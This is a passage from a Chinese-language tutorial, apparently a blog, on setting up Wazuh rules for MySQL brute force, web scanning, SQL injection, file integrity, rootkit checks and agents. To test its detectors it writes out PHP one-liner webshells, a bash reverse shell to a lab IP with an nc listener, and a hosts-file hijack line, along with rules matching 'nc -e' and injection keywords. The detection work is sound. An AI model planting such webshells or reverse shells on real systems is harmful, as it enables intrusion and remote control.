  &lt;regex offset="after_prematch"&gt;Access denied for user '(\S+)'@'(\S+)' &lt;/regex&gt;
  &lt;order&gt;user, srcip&lt;/order&gt;
&lt;/decoder&gt;
</code></pre> 
<p><img src="https://images2.imgbox.com/59/f4/5j8Jy9py_o.png" alt="在这里插入图片描述"></p> 
<p>复制mysql规则到自定义规则</p> 
<p>/var/ossec/etc/rules/local_rules.xml</p> 
<p>50100依赖mysql_log解码器，只是一个简单描述</p> 
<p>50105依赖50100规则，如果50100规则成立，并且登录成功，用$(dstuser)拿到用户名，注意dstuser也是标准写法</p> 
<p>50106依赖50105规则，如果50105规则成立，并且登录失败，用$(dstuser)拿到用户名</p> 
<p>50107依赖50106规则，如果50106匹配上了，说明是用户登录失败的情况，再加上用了标签user匹配是test的用户，也就是如果登录失败，并且用户名是test，就会触发本条规则</p> 
<p>50108好理解，依赖50100规则，和50105类似</p> 
<p>重点：</p> 
<p>561002依赖50106，如果50106规则30s内触发了5次就会告警</p> 
<pre><code>&lt;group name="mysql_log,"&gt;
  &lt;rule id="50100" level="0" overwrite="yes"&gt;
    &lt;decoded_as&gt;mysql_log&lt;/decoded_as&gt;
    &lt;description&gt;MySQL messages grouped.&lt;/description&gt;
  &lt;/rule&gt;

  &lt;rule id="50105" level="3" overwrite="yes"&gt;
    &lt;if_sid&gt;50100&lt;/if_sid&gt;
    &lt;regex&gt;\d+ Connect&lt;/regex&gt;
    &lt;description&gt;MySQL: 用户$(dstuser)正在登录&lt;/description&gt;
    &lt;mitre&gt;
      &lt;id&gt;T1078&lt;/id&gt;
    &lt;/mitre&gt;
    &lt;group&gt;authentication_success,&lt;/group&gt;
  &lt;/rule&gt;

  &lt;rule id="50106" level="9" overwrite="yes"&gt;
    &lt;if_sid&gt;50105&lt;/if_sid&gt;
    &lt;match&gt;Access denied for user&lt;/match&gt;
    &lt;description&gt;MySQL: 用户$(dstuser)登录失败&lt;/description&gt;
    &lt;group&gt;authentication_failed,&lt;/group&gt;
  &lt;/rule&gt;

  &lt;rule id="50107" level="7" overwrite="yes"&gt;
    &lt;if_sid&gt;50106&lt;/if_sid&gt;
    &lt;match&gt;Access denied for user&lt;/match&gt;
    &lt;description&gt;MySQL: 用户test登录失败&lt;/description&gt;
    &lt;user&gt;test&lt;/user&gt;
    &lt;group&gt;authentication_failed,&lt;/group&gt;
  &lt;/rule&gt;

  &lt;rule id="50108" level="3" overwrite="yes"&gt;
    &lt;if_sid&gt;50100&lt;/if_sid&gt;
    &lt;match&gt;select @@version_comment limit 1&lt;/match&gt;
    &lt;description&gt;MySQL: 用户$(dstuser)登录成功&lt;/description&gt;
    &lt;group&gt;authentication_failed,mysql_query,&lt;/group&gt;
  &lt;/rule&gt;

  &lt;rule id="561002" level="12" frequency="5" timeframe="30"&gt;
    &lt;if_matched_sid&gt;50106&lt;/if_matched_sid&gt;
    &lt;description&gt;MySQL: 用户$(dstuser)多次登录失败，疑似爆破.&lt;/description&gt;
    &lt;group&gt;attack,&lt;/group&gt;
  &lt;/rule&gt;
&lt;/group&gt;
</code></pre> 
<p><img src="https://images2.imgbox.com/72/fd/VRE2vUre_o.png" alt="在这里插入图片描述"></p> 
<p>输入正确密码，查看alert.log</p> 
<pre><code>mysql -uroot -p123456 -h192.168.174.5
</code></pre> 
<p>只报了5018和50105，没问题，50108和50105都是依赖50100，但是并没有报50100，说明在真实环境alert.log中，后面的触发了，前面的就不会触发</p> 
<p><img src="https://images2.imgbox.com/44/22/PIx2qLNF_o.png" alt="在这里插入图片描述"></p> 
<p>在命令行测试</p> 
<pre><code>/var/ossec/bin/wazuh-logtest
</code></pre> 
<p>输入正确登录日志</p> 
<pre><code>7 Query     select @@version_comment limit 1
</code></pre> 
<p>但是命令行只触发了50108</p> 
<p><img src="https://images2.imgbox.com/f4/3d/6IUpDWms_o.png" alt="在这里插入图片描述"></p> 
<p>输入错误密码1次，查看alert.log，触发50105和50106</p> 
<pre><code>mysql -uroot -p12345 -h192.168.174.5
</code></pre> 
<p><img src="https://images2.imgbox.com/71/4f/VGeja4Pl_o.png" alt="在这里插入图片描述"></p> 
<p>输入test用户错误密码1次，查看alert.log，触发50105和50107</p> 
<pre><code>mysql -utest -p12345 -h192.168.174.5
</code></pre> 
<p><img src="https://images2.imgbox.com/75/b3/K8btksUj_o.png" alt="在这里插入图片描述"></p> 
<p>30s内输入5次</p> 
<pre><code>mysql -uroot -p12345 -h192.168.174.5
</code></pre> 
<p><img src="https://images2.imgbox.com/56/65/YiofiSiA_o.png" alt="在这里插入图片描述"></p> 
<p>再加一条</p> 
<p>基于50106，如果相同ip，不同用户的，在30秒内3次的就告警，静默时间30s</p> 
<p>静态字段像是user、ip就用指定的标签different_user、same_srcip</p> 
<p>【动态字段使用same_field、different_field这类标签判断】</p> 
<pre><code>https://documentation.wazuh.com/current/user-manual/ruleset/ruleset-xml-syntax/rules.html?highlight=same
</code></pre> 
<pre><code>  &lt;rule id="51106" level="10" frequency="3" timeframe="30" ignore="30"&gt;
    &lt;if_matched_sid&gt;50106&lt;/if_matched_sid&gt;
    &lt;same_srcip /&gt;
    &lt;different_user /&gt;
    &lt;description&gt;相同ip，不同用户&lt;/description&gt;
    &lt;group&gt;attack,&lt;/group&gt;
  &lt;/rule&gt;
</code></pre> 
<p><img src="https://images2.imgbox.com/fa/05/HpioHtLE_o.png" alt="在这里插入图片描述"></p> 
<p>改用动态字段，当然解码器和规则都得改</p> 
<pre><code>&lt;decoder name="mysql_log"&gt;
  &lt;prematch&gt;\d+ Connect|\d+ Query&lt;/prematch&gt;
  &lt;regex offset="after_prematch"&gt;Access denied for user '(\S+)'@'(\S+)' &lt;/regex&gt;
  &lt;!-- &lt;order&gt;user, srcip&lt;/order&gt; --&gt;
  &lt;order&gt;u, i&lt;/order&gt;
&lt;/decoder&gt;
</code></pre> 
<p><img src="https://images2.imgbox.com/eb/68/e4EVv7Yj_o.png" alt="在这里插入图片描述"></p> 
<pre><code>  &lt;rule id="51106" level="10" frequency="3" timeframe="30" ignore="30"&gt;
    &lt;if_matched_sid&gt;50106&lt;/if_matched_sid&gt;
    &lt;same_field&gt;i&lt;/same_field&gt;
    &lt;description&gt;相同ip&lt;/description&gt;
    &lt;group&gt;attack,&lt;/group&gt;
  &lt;/rule&gt;
</code></pre> 
<p><img src="https://images2.imgbox.com/63/1c/6LnkThAZ_o.png" alt="在这里插入图片描述"></p> 
<p><img src="https://images2.imgbox.com/5c/d2/pJDsCr2Y_o.png" alt="在这里插入图片描述"></p> 
<h2><a id="web_1325"></a>web日志</h2> 
<h3><a id="_1327"></a>常见日志</h3> 
<p>开启web站点vaudit</p> 
<pre><code>http://192.168.174.5:81/
</code></pre> 
<p><img src="https://images2.imgbox.com/02/24/Maw3k6Lw_o.png" alt="在这里插入图片描述"></p> 
<p>在/var/ossec/etc/ossec.conf加入lampp的访问日志</p> 
<p>log_format不止有syslog一个，好像其他的也没这个更适合这里</p> 
<pre><code>  &lt;localfile&gt;
    &lt;log_format&gt;syslog&lt;/log_format&gt;
    &lt;location&gt;/opt/lampp/logs/access_log&lt;/location&gt;
  &lt;/localfile&gt;
</code></pre> 
<p><img src="https://images2.imgbox.com/75/3d/uocOE9pK_o.png" alt="在这里插入图片描述"></p> 
<p>日志记录</p> 
<p><img src="https://images2.imgbox.com/da/24/Gir7UNB8_o.png" alt="在这里插入图片描述"></p> 
<p>查看wazuh内置的web解码器，发现只有这个解码器【web-accesslog-ip】相对合适</p> 
<p>/var/ossec/ruleset/decoders/0375-web-accesslog_decoders.xml</p> 
<p>拿到了ip、方法、url和状态码（id），后面id就是状态码</p> 
<p><img src="https://images2.imgbox.com/6b/8e/2TLswWgf_o.png" alt="在这里插入图片描述"></p> 
<p>再看看web的规则库，没啥感觉</p> 
<p>/var/ossec/ruleset/rules/0245-web_rules.xml</p> 
<p>我们重写31101规则</p> 
<p>/var/ossec/etc/rules/local_rules.xml</p> 
<p>561106规则总不触发，是因为触发了别的规则，，怎么办呢，加noalert=“1”</p> 
<pre><code>触发403
http://192.168.174.5:81/phpmyadmin
</code></pre> 
<pre><code>192.168.174.1 - - [07/Mar/2023:15:35:34 +0800] "GET /user/reg.php111 HTTP/1.1" 404 1034
192.168.174.2 - - [07/Mar/2023:15:35:34 +0800] "GET /user/reg.php111 HTTP/1.1" 404 1034
192.168.174.3 - - [07/Mar/2023:15:35:34 +0800] "GET /user/reg.php111 HTTP/1.1" 404 1034
192.168.174.4 - - [07/Mar/2023:15:35:34 +0800] "GET /user/reg.php111 HTTP/1.1" 404 1034
192.168.174.5 - - [07/Mar/2023:15:35:34 +0800] "GET /user/reg.php111 HTTP/1.1" 404 1034
</code></pre> 
<pre><code>&lt;group name="web_log,"&gt;
  &lt;rule id="31101" level="5" overwrite="yes"&gt;
    &lt;if_sid&gt;31100&lt;/if_sid&gt;
    &lt;id&gt;^404$&lt;/id&gt;
    &lt;description&gt;Web server 404 error code.&lt;/description&gt;
    &lt;group&gt;attack,pci_dss_6.5,pci_dss_11.4,gdpr_IV_35.7.d,nist_800_53_SA.11,nist_800_53_SI.4,tsc_CC6.6,tsc_CC7.1,tsc_CC8.1,tsc_CC6.1,tsc_CC6.8,tsc_CC7.2,tsc_CC7.3,&lt;/group&gt;
  &lt;/rule&gt;

  &lt;rule id="561101" level="10" frequency="5" timeframe="30"&gt;
    &lt;if_matched_sid&gt;31101&lt;/if_matched_sid&gt;
    &lt;same_source_ip /&gt;
    &lt;description&gt;同一个IP不断出现404，疑似扫描&lt;/description&gt;
    &lt;group&gt;attack,&lt;/group&gt;
  &lt;/rule&gt;

  &lt;rule id="561102" level="10" frequency="5" timeframe="30"&gt;
    &lt;if_matched_sid&gt;31101&lt;/if_matched_sid&gt;
    &lt;different_srcip /&gt;
    &lt;description&gt;不同IP不断出现404，疑似扫描&lt;/description&gt;
    &lt;group&gt;attack,&lt;/group&gt;
  &lt;/rule&gt;

  &lt;rule id="561103" level="5"&gt;
    &lt;if_sid&gt;31100&lt;/if_sid&gt;
    &lt;id&gt;^403$&lt;/id&gt;
    &lt;description&gt;Web server 403 error code.&lt;/description&gt;
    &lt;group&gt;attack,pci_dss_6.5,pci_dss_11.4,gdpr_IV_35.7.d,nist_800_53_SA.11,nist_800_53_SI.4,tsc_CC6.6,tsc_CC7.1,tsc_CC8.1,tsc_CC6.1,tsc_CC6.8,tsc_CC7.2,tsc_CC7.3,&lt;/group&gt;
  &lt;/rule&gt;

  &lt;rule id="561104" level="10" frequency="5" timeframe="30"&gt;
    &lt;if_matched_sid&gt;561103&lt;/if_matched_sid&gt;
    &lt;description&gt;Web server 403 error code.&lt;/description&gt;
    &lt;group&gt;attack,&lt;/group&gt;
  &lt;/rule&gt;

  &lt;rule id="561105" level="5"&gt;
    &lt;if_matched_sid&gt;31100&lt;/if_matched_sid&gt;
    &lt;url&gt;/user/logCheck.php&lt;/url&gt;
    &lt;protocol&gt;POST&lt;/protocol&gt;
    &lt;description&gt;某个IP正在登录&lt;/description&gt;
    &lt;group&gt;attack,&lt;/group&gt;
  &lt;/rule&gt;

  &lt;rule id="561106" level="10" frequency="5" timeframe="30"&gt;
    &lt;if_matched_sid&gt;561105&lt;/if_matched_sid&gt;
    &lt;description&gt;相同IP频繁访问登录接口，疑似登录爆破&lt;/description&gt;
    &lt;group&gt;attack,&lt;/group&gt;
  &lt;/rule&gt;

&lt;/group&gt;
</code></pre> 
<h3><a id="SQL_1470"></a>SQL注入</h3> 
<pre><code>  &lt;rule id="561106" level="10" frequency="5" timeframe="30"&gt;
    &lt;if_matched_sid&gt;561105&lt;/if_matched_sid&gt;
    &lt;description&gt;相同IP频繁访问登录接口，疑似登录爆破&lt;/description&gt;
    &lt;group&gt;attack,&lt;/group&gt;
  &lt;/rule&gt;

  &lt;rule id="561301" level="8"&gt;
    &lt;regex&gt;union|select|order by|and|or&lt;/regex&gt;
    &lt;description&gt;疑似SQL注入&lt;/description&gt;
    &lt;group&gt;attack,&lt;/group&gt;
  &lt;/rule&gt;
  &lt;rule id="561302" level="10" frequency="5" timeframe="30"&gt;
    &lt;if_matched_sid&gt;561301&lt;/if_matched_sid&gt;
    &lt;same_source_ip /&gt;
    &lt;description&gt;相同IP进行SQL注入&lt;/description&gt;
    &lt;group&gt;attack,&lt;/group&gt;
  &lt;/rule&gt;  
</code></pre> 
<h2><a id="_1498"></a>文件完整性检查</h2> 
<p>修改文件，启用文件，在syscheck标签中做简单修改</p> 
<p>/var/ossec/etc/ossec.conf</p> 
<p>完整syscheck标签内容如下，增加新目录</p> 
<pre><code>  &lt;!-- File integrity monitoring --&gt;
  &lt;syscheck&gt;
    &lt;disabled&gt;no&lt;/disabled&gt;

    &lt;!-- Frequency that syscheck is executed default every 12 hours --&gt;
    &lt;!-- 用户自定义时间，默认为43200秒，即12小时
    测试环境方便调试我改为10s，10s扫一次文件 --&gt;
    &lt;!-- &lt;frequency&gt;43200&lt;/frequency&gt; --&gt;
    &lt;frequency&gt;10&lt;/frequency&gt;
    
    &lt;!-- 每次开启wazuh时扫描，生产不用开，测试环境开 --&gt;
    &lt;scan_on_start&gt;yes&lt;/scan_on_start&gt;

    &lt;!-- Generate alert when new file detected --&gt;
    &lt;alert_new_files&gt;yes&lt;/alert_new_files&gt;

    &lt;!-- Don't ignore files that change more than 'frequency' times --&gt;
    &lt;auto_ignore frequency="10" timeframe="3600"&gt;no&lt;/auto_ignore&gt;

    &lt;!-- Directories to check  (perform all possible verifications) --&gt;
    &lt;directories&gt;/etc,/usr/bin,/usr/sbin&lt;/directories&gt;
    &lt;directories&gt;/bin,/sbin,/boot&lt;/directories&gt;

    &lt;!-- 用户自定义目录 --&gt;
    &lt;directories&gt;/opt/lampp/htdocs,/tmp&lt;/directories&gt;

    &lt;!-- Files/directories to ignore --&gt;
    &lt;ignore&gt;/etc/mtab&lt;/ignore&gt;
    &lt;ignore&gt;/etc/hosts.deny&lt;/ignore&gt;
    &lt;ignore&gt;/etc/mail/statistics&lt;/ignore&gt;
    &lt;ignore&gt;/etc/random-seed&lt;/ignore&gt;
    &lt;ignore&gt;/etc/random.seed&lt;/ignore&gt;
    &lt;ignore&gt;/etc/adjtime&lt;/ignore&gt;
    &lt;ignore&gt;/etc/httpd/logs&lt;/ignore&gt;
    &lt;ignore&gt;/etc/utmpx&lt;/ignore&gt;
    &lt;ignore&gt;/etc/wtmpx&lt;/ignore&gt;
    &lt;ignore&gt;/etc/cups/certs&lt;/ignore&gt;
    &lt;ignore&gt;/etc/dumpdates&lt;/ignore&gt;
    &lt;ignore&gt;/etc/svc/volatile&lt;/ignore&gt;

    &lt;!-- File types to ignore --&gt;
    &lt;ignore type="sregex"&gt;.log$|.swp$&lt;/ignore&gt;

    &lt;!-- Check the file, but never compute the diff --&gt;
    &lt;nodiff&gt;/etc/ssl/private.key&lt;/nodiff&gt;

    &lt;skip_nfs&gt;yes&lt;/skip_nfs&gt;
    &lt;skip_dev&gt;yes&lt;/skip_dev&gt;
    &lt;skip_proc&gt;yes&lt;/skip_proc&gt;
    &lt;skip_sys&gt;yes&lt;/skip_sys&gt;

    &lt;!-- Nice value for Syscheck process --&gt;
    &lt;process_priority&gt;10&lt;/process_priority&gt;

    &lt;!-- Maximum output throughput --&gt;
    &lt;max_eps&gt;100&lt;/max_eps&gt;

    &lt;!-- Database synchronization settings --&gt;
    &lt;synchronization&gt;
      &lt;enabled&gt;yes&lt;/enabled&gt;
      &lt;interval&gt;5m&lt;/interval&gt;
      &lt;max_interval&gt;1h&lt;/max_interval&gt;
      &lt;max_eps&gt;10&lt;/max_eps&gt;
    &lt;/synchronization&gt;
  &lt;/syscheck&gt;
</code></pre> 
<h3><a id="_1582"></a>添加账户</h3> 
<p>修改/etc/passwd文件，新增账号test321，触发550规则，好多文件都被修改</p> 
<pre><code>useradd test321
</code></pre> 
<p><img src="https://images2.imgbox.com/13/97/vGjjL57G_o.png" alt="在这里插入图片描述"></p> 
<h3><a id="etc_1599"></a>/etc下增加/删除文件</h3> 
<pre><code>echo hello &gt; /etc/hello11111111111111111.txt
</code></pre> 
<p><img src="https://images2.imgbox.com/36/a7/qSgac3X5_o.png" alt="在这里插入图片描述"></p> 
<p>删除这个文件</p> 
<pre><code>rm -f /etc/hello11111111111111111.txt
</code></pre> 
<p><img src="https://images2.imgbox.com/37/44/uHhLmOLi_o.png" alt="在这里插入图片描述"></p> 
<h3><a id="_1629"></a>写一句话</h3> 
<pre><code>echo '&lt;?php ($_=@$GET['s']).@$($POST['pass']);?&gt;' &gt; /opt/lampp/htdocs/test_shell.php
</code></pre> 
<p><img src="https://images2.imgbox.com/c4/d6/sCVwDHtC_o.png" alt="在这里插入图片描述"></p> 
<p>修改权限也会被发现</p> 
<pre><code>chmod 755 /opt/lampp/htdocs/test_shell.php
</code></pre> 
<h2><a id="_1654"></a>命令监控</h2> 
<p>攻击者监听端口</p> 
<pre><code>nc -lvvp 4444
</code></pre> 
<p>wazuh服务器执行</p> 
<pre><code>bash &gt;&amp; /dev/tcp/192.168.33.93/4444 0&gt;&amp;1
</code></pre> 
<p><img src="https://images2.imgbox.com/08/35/pAmcK6E7_o.png" alt="在这里插入图片描述"></p> 
<p>查看端口，特征是带bash的</p> 
<p><img src="https://images2.imgbox.com/b3/e1/JGBvi8dV_o.png" alt="在这里插入图片描述"></p> 
<p>常用的命令</p> 
<pre><code>netstat -anptl | grep bash
ss -apn | grep ESTAB | egrep '("bash"|"sh")'
ps -eo user,pid,cmd | grep /bash
</code></pre> 
<p>加入命令监控</p> 
<p>/var/ossec/etc/ossec.conf</p> 
<pre><code>  &lt;localfile&gt;
    &lt;log_format&gt;command&lt;/log_format&gt;
    &lt;command&gt;netstat -anptl&lt;/command&gt;
    &lt;frequency&gt;10&lt;/frequency&gt;
  &lt;/localfile&gt;
</code></pre> 
<p><img src="https://images2.imgbox.com/03/04/lFQXkEDe_o.png" alt="在这里插入图片描述"></p> 
<p>完善规则</p> 
<p>/var/ossec/etc/rules/local_rules.xml</p> 
<pre><code>&lt;group name="ossec,"&gt;
  &lt;rule id="200001" level="6" noalert="1"&gt;
    &lt;if_sid&gt;530&lt;/if_sid&gt;
      &lt;match&gt;ossec: output: 'netstat -anptl'&lt;/match&gt;
      &lt;description&gt;正在监听反弹shell&lt;/description&gt;
      &lt;group&gt;process_monitor,&lt;/group&gt;
  &lt;/rule&gt;
  &lt;rule id="200002" level="8"&gt;
    &lt;if_sid&gt;200001&lt;/if_sid&gt;
      &lt;match&gt;bash&lt;/match&gt;
      &lt;description&gt;监听到bash反弹shell&lt;/description&gt;
      &lt;group&gt;process_monitor,attack&lt;/group&gt;
  &lt;/rule&gt;
&lt;/group&gt;
</code></pre> 
<p><img src="https://images2.imgbox.com/ed/73/LQB2NWg4_o.png" alt="在这里插入图片描述"></p> 
<p><img src="https://images2.imgbox.com/0c/0a/Xj1P8Tfb_o.png" alt="在这里插入图片描述"></p> 
<p>nc也一样，放开ossec配置</p> 
<pre><code>  &lt;localfile&gt;
    &lt;log_format&gt;command&lt;/log_format&gt;
    &lt;command&gt;ps -ef&lt;/command&gt;
    &lt;frequency&gt;10&lt;/frequency&gt;
  &lt;/localfile&gt;
</code></pre> 
<pre><code>&lt;group name="ossec,"&gt;
  &lt;rule id="210001" level="6" noalert="1"&gt;
    &lt;if_sid&gt;530&lt;/if_sid&gt;
      &lt;match&gt;ossec: output: 'ps -ef'&lt;/match&gt;
      &lt;description&gt;正在查询恶意进程&lt;/description&gt;
      &lt;group&gt;process_monitor,&lt;/group&gt;
  &lt;/rule&gt;
  &lt;rule id="210002" level="8"&gt;
    &lt;if_sid&gt;210001&lt;/if_sid&gt;
      &lt;match&gt;nc -e&lt;/match&gt;
      &lt;description&gt;监听到nc反弹shell&lt;/description&gt;
      &lt;group&gt;process_monitor,attack&lt;/group&gt;
  &lt;/rule&gt;
&lt;/group&gt;
</code></pre> 
<p><img src="https://images2.imgbox.com/6d/ee/FXbtFv2p_o.png" alt="在这里插入图片描述"></p> 
<h2><a id="rootcheck_1794"></a>rootcheck</h2> 
<h3><a id="rootkit_1796"></a>rootkit</h3> 
<p>对我们最亲爱的rootkit木马进行监测</p> 
<p>首先开启rootcheck，当然默认是开启的，我这里只改了一个参数，就是把频率改小了</p> 
<p>完整配置如下</p> 
<pre><code>频率改为10s
</code></pre> 
<pre><code>  &lt;!-- Policy monitoring --&gt;
  &lt;rootcheck&gt;
    &lt;disabled&gt;no&lt;/disabled&gt;
    &lt;check_files&gt;yes&lt;/check_files&gt;
    &lt;check_trojans&gt;yes&lt;/check_trojans&gt;
    &lt;check_dev&gt;yes&lt;/check_dev&gt;
    &lt;check_sys&gt;yes&lt;/check_sys&gt;
    &lt;check_pids&gt;yes&lt;/check_pids&gt;
    &lt;check_ports&gt;yes&lt;/check_ports&gt;
    &lt;check_if&gt;yes&lt;/check_if&gt;

    &lt;!-- Frequency that rootcheck is executed - every 12 hours --&gt;
    &lt;!-- &lt;frequency&gt;43200&lt;/frequency&gt; --&gt;
    &lt;frequency&gt;10&lt;/frequency&gt;
    &lt;rootkit_files&gt;etc/rootcheck/rootkit_files.txt&lt;/rootkit_files&gt;
    &lt;rootkit_trojans&gt;etc/rootcheck/rootkit_trojans.txt&lt;/rootkit_trojans&gt;

    &lt;skip_nfs&gt;yes&lt;/skip_nfs&gt;
  &lt;/rootcheck&gt;
</code></pre> 
<p><img src="https://images2.imgbox.com/db/da/SKIp3mFk_o.png" alt="在这里插入图片描述"></p> 
<p>我们需要注意两个文件/var/ossec/etc/rootcheck/rootkit_files.txt和/var/ossec/etc/rootcheck/rootkit_trojans.txt</p> 
<p>先来看看/var/ossec/etc/rootcheck/rootkit_files.txt</p> 
<p>只要tmp目录下创建了文字为mcliZokhb的文件，就认为木马了</p> 
<p><img src="https://images2.imgbox.com/51/83/SDEqSrd0_o.png" alt="在这里插入图片描述"></p> 
<p>这条也一样，只要tmp下有.dump文件就认为是木马，这还是个.开头的隐藏文件</p> 
<p><img src="https://images2.imgbox.com/1c/11/QzXEGPBg_o.png" alt="在这里插入图片描述"></p> 
<p>话不多说，我们来测试一下</p> 
<pre><code>echo "" &gt; /tmp/mcliZokhb
echo "" &gt; /tmp/.dump
</code></pre> 
<p>看到了告警，所以这个文件是一个文件名的黑名单</p> 
<p><img src="https://images2.imgbox.com/98/e5/MS7SR23R_o.png" alt="在这里插入图片描述"></p> 
<pre><code>rm -f /tmp/mcliZokhb /tmp/.dump
</code></pre> 
<p>删掉刚刚创建的恶意文件后，再来看看/var/ossec/etc/rootcheck/rootkit_trojans.txt</p> 
<p>这一部分是查看命令的内容有没有被恶意人员改变而劫持</p> 
<p><img src="https://images2.imgbox.com/1e/6f/p9B2hPDE_o.png" alt="在这里插入图片描述"></p> 
<p>这里是看hosts文件是否被劫持，像这种麦咖啡和微软的域名也在监控范围内，应该是怕黑客改了hosts域名解析，导致服务器访问麦咖啡域名或者微软解析到黑客的服务器上去更新病毒库或者补丁吧</p> 
<p><img src="https://images2.imgbox.com/49/87/OhYdJPja_o.png" alt="在这里插入图片描述"></p> 
<p>我们来改一下hosts文件，追加一条</p> 
<pre><code>echo "127.0.0.1 mcafee.com" &gt;&gt; /etc/hosts
</code></pre> 
<p>看到我们之前的文件完整性监控和rootcheck监控都检测到了</p> 
<p><img src="https://images2.imgbox.com/bf/94/f2hB31Va_o.png" alt="在这里插入图片描述"></p> 
<p>删掉这一条</p> 
<h3><a id="system_audit_1932"></a>system audit</h3> 
<p>也偏向文件监控，和签名的大同小异，主要看我们文件的配置是否正确啊，文件内容有没有异常函数这种</p> 
<p>当然是我们自定义配置，在etc/rootcheck/目录下创建system_audit_lampp.txt，内容如下</p> 
<p>如果php.ini中allow_url_include=On，说明开启，我们就报警</p> 
<p>如果/opt/lampp/htdocs目录下有符合eval.*POST的，我们就认为有一句话</p> 
<pre><code># 可以定义我们自己的变量
$php.ini=/opt/lampp/etc/php.ini;
$web_dirs=/opt/lampp/htdocs;

# 规则分为三部分
# 第一部分注释，可以不写
# 第二部分，[规则描述] [触发条件] [参考引用]，注意[]和[]之间要加空格
# 第三部分，规则本身，方向箭头左边，f文件，d目录，p进程，c命令，r注册表
# 方向箭头右边 ，可以写普通文件，代表模糊匹配，也可以写r:代表正则，也可以逻辑运算&amp;&amp;多条件匹配
# 如果是目录，则需要定义一个中间箭头，用于确认查询当前目录下的哪些文件

# PHP CHECK
[PHP - 远程文件包含开启] [any] []
f:$php.ini -&gt; r:^allow_url_include=On;

# WEB SHELl CHECK
[PHP - 疑似有一句话] [any] []
d:/opt/lampp/htdocs -&gt; .php$ -&gt; r:eval;
</code></pre> 
<p><img src="https://images2.imgbox.com/d7/8b/4gnQqdW8_o.png" alt="在这里插入图片描述"></p> 
<p>rootcheck引用system_audit标签</p> 
<pre><code>  &lt;!-- Policy monitoring --&gt;
  &lt;rootcheck&gt;
    &lt;disabled&gt;no&lt;/disabled&gt;
    &lt;check_files&gt;yes&lt;/check_files&gt;
    &lt;check_trojans&gt;yes&lt;/check_trojans&gt;
    &lt;check_dev&gt;yes&lt;/check_dev&gt;
    &lt;check_sys&gt;yes&lt;/check_sys&gt;
    &lt;check_pids&gt;yes&lt;/check_pids&gt;
    &lt;check_ports&gt;yes&lt;/check_ports&gt;
    &lt;check_if&gt;yes&lt;/check_if&gt;

    &lt;!-- Frequency that rootcheck is executed - every 12 hours --&gt;
    &lt;!-- &lt;frequency&gt;43200&lt;/frequency&gt; --&gt;
    &lt;frequency&gt;10&lt;/frequency&gt;
    &lt;rootkit_files&gt;etc/rootcheck/rootkit_files.txt&lt;/rootkit_files&gt;
    &lt;rootkit_trojans&gt;etc/rootcheck/rootkit_trojans.txt&lt;/rootkit_trojans&gt;

    &lt;system_audit&gt;etc/rootcheck/system_audit_lampp.txt&lt;/system_audit&gt;
    &lt;skip_nfs&gt;yes&lt;/skip_nfs&gt;
  &lt;/rootcheck&gt;
</code></pre> 
<p><img src="https://images2.imgbox.com/bf/6c/fwQgkZBX_o.png" alt="在这里插入图片描述"></p> 
<p>修改php.ini，开启远程文件包含</p> 
<pre><code>vim /opt/lampp/etc/php.ini
</code></pre> 
<p><img src="https://images2.imgbox.com/e8/a2/Iz2m4ZdL_o.png" alt="在这里插入图片描述"></p> 
<p><img src="https://images2.imgbox.com/f1/51/kzlJLmtF_o.png" alt="在这里插入图片描述"></p> 
<p>创建个一句话的文件</p> 
<pre><code>echo '&lt;?php eval($_POST("pass"));?&gt;' &gt; /opt/lampp/htdocs/test_shell.php
</code></pre> 
<p><img src="https://images2.imgbox.com/9e/6e/BsEjtksT_o.png" alt="在这里插入图片描述"></p> 
<h3><a id="sca_2039"></a>sca</h3> 
<p>检测操作系统的各种配置</p> 
<h2><a id="syslogrsyslog_2047"></a>syslog和rsyslog</h2> 
<p>远程采集别的服务器的日志，可以通过</p> 
<p>1、syslog</p> 
<p>2、用户名密码，不推荐，只能做简单的</p> 
<p>3、agent</p> 
<p>再找一台服务器，启动rsyslog</p> 
<pre><code>启动
systemctl status rsyslog

rsyslog配置文件
vim /etc/rsyslog.conf
</code></pre> 
<p>在wazuh服务器的/etc/rsyslog.conf修改</p> 
<p>如果是来自192.168.174.134的日志，保存到/var/log/host_192.168.174.134.log下，并重启</p> 
<pre><code>:FROMHOST-IP, isequal, "192.168.174.134" /var/log/host_192.168.174.134.log
:FROMHOST-IP, isequal, "192.168.174.134" ~
</code></pre> 
<p>查看服务器端的514udp为开启状态</p> 
<pre><code>netstat -anu
</code></pre> 
<p>在客户端/etc/rsyslog.conf修改，增加一行，然后重启</p> 
<pre><code>*.* @192.168.174.5:514
</code></pre> 
<h2><a id="wazuhsyslog_2106"></a>wazuh-syslog</h2> 
<p>wazuh服务器，可以将自己的预警日志通过syslog发送给别的服务器</p> 
<p>wazuh客户端，可以通过syslog把日志发送给wazuh服务器</p> 
<h2><a id="wazuhagent_2116"></a>wazuh-agent客户端</h2> 
<p>服务端生成key，</p> 
<p>A添加agent</p> 
<p>E获取agent的key（根据ID获取）</p> 
<p>L列出agent</p> 
<p>R删除agent</p> 
<p>Q退出</p> 
<pre><code>/var/ossec/bin/manage_agents
</code></pre> 
<p>开启1514，开启后1514端口会打开</p> 
<pre><code>  &lt;remote&gt;
    &lt;connection&gt;secure&lt;/connection&gt;
    &lt;port&gt;1514&lt;/port&gt;
    &lt;protocol&gt;tcp&lt;/protocol&gt;
    &lt;queue_size&gt;131072&lt;/queue_size&gt;
  &lt;/remote&gt;
</code></pre> 
<p>要加哪个客户端就加，选择A的选项，输入name和ip后，拿到key</p> 
<h3><a id="windows_2159"></a>windows</h3> 
<p>在官网下载agent，wazuh-agent-4.1.5-1.msi，双击下一步安装后</p> 
<p>安装在C:\Program Files (x86)\ossec-agent</p> 
<p><img src="https://images2.imgbox.com/b9/c8/R87Tt0wt_o.png" alt="在这里插入图片描述"></p> 
<p>打开配置文件</p> 
<p><img src="https://images2.imgbox.com/19/94/0aImzpBH_o.png" alt="在这里插入图片描述"></p> 
<p>写上服务器的配置和之前添加生成的key，该文件也包含了监控的各个目录</p> 
<p><img src="https://images2.imgbox.com/9f/89/WcyZbh7g_o.png" alt="在这里插入图片描述"></p> 
<p>或者使用ui进行ip和key的配置</p> 
<p><img src="https://images2.imgbox.com/1f/72/g59X8b2F_o.png" alt="在这里插入图片描述"></p> 
<p>频率改为10s，并开启服务</p> 
<p><img src="https://images2.imgbox.com/bc/2e/eNmvVFDs_o.png" alt="在这里插入图片描述"></p> 
<p><img src="https://images2.imgbox.com/34/47/w4BB95FO_o.png" alt="在这里插入图片描述"></p> 
<p>在服务器上可以看到</p> 
<p><img src="https://images2.imgbox.com/90/7f/hpFL7z3g_o.png" alt="在这里插入图片描述"></p> 
<p>登录失败就会监听到</p> 
